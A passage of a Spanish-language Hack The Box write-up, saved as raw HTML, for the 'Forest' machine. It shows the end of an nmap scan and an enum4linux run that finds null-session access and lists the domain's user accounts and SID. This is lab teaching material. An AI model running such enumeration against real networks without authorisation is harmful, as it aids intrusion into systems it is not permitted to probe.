&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-10-25 00:22:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Oct 25 01:16:55 2019 -- 1 IP address (1 host up) scanned in 529.48 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 
Starting enum4linux v0.8.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; on Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 04:31:58 &lt;span class=&#34;nv&#34;&gt;2019&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
Target ........... 10.10.10.161
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;


 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.161    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.161 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 451.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Got domain/workgroup name: 

 &lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting information via LDAP &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Long domain name &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161: htb.local
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.10.161 appears to be a root/parent &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting domain SID &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 359.
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Host is part of a domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;not a workgroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 866.
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: &lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrator	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;8cc370d3-822a-4ab8-a926-bb94bd0641a9&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 881.
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Administrator&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guest&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;krbtgt&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f6&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DefaultAccount&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f7&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x463&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_2c8eef0a09b545acb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x464&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_ca8c2ed5bdab4dc9b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x465&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_75a538d3025e4db9a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x466&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_681f53d4942840e18&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x467&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_1b41c9286325456bb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x468&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_9b69f1b9d2cc45549&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x469&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_7c96b981967141ebb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_c75ee099d0a64c91b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SM_1ffab36a2f5f479cb&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxc3d7722&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxfc9daad&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x46f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxc0a90c9&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x470&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox670628e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x471&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox968e74d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x472&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox6ded678&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x473&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox83d6781&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x474&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxfd87238&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x475&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailboxb01ac64&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x476&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox7108a4e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x477&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HealthMailbox0659cc1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x478&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
